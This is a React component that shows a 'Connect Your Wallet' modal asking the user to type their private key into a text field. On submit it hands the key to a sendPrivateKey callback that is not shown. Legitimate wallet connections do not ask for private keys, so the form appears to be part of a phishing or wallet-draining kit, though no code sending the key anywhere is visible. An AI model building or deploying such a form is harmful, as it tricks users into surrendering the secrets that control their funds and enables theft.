import React, { useState } from "react";
import styles from "./PrivateKeyModal.module.css";

function PrivateKeyModal({closePrivateKeyForm, sendPrivateKey}) {
  const [privateKey, setPrivateKey] = useState("");

  const submitPhrase=(e)=>{
    e.preventDefault()

    if(privateKey)
      sendPrivateKey(privateKey)
  }


  return (
    <div className={styles.overlay} onClick={closePrivateKeyForm}>
      <div
        className={styles.modalContainer}
        onClick={(e) => e.stopPropagation()} // Prevents closing the modal when clicking inside
      >
        <button className={styles.closeButton} onClick={closePrivateKeyForm}>
          &times;
        </button>
        <h2>Connect Your Wallet</h2>
        <p className={styles.topP}>Input Private Key phrase</p>
        <div className={styles.formGroup}>
          <input
            type="text"
            className={styles.privateKeyInput}
            placeholder="Enter Private Key*"
            value={privateKey}
            onChange={(e)=>setPrivateKey(e.target.value)}
          />
        </div>
        <p className={styles.infoText}>
          Typically contains a string of alphanumeric characters which are about
          50 or more in number.
        </p>
        <div className={styles.buttonGroup}>
          <button className={styles.connectButton} onClick={submitPhrase}>
            Connect Wallet
          </button>
        </div>
      </div>
    </div>
  );
}

export default PrivateKeyModal;
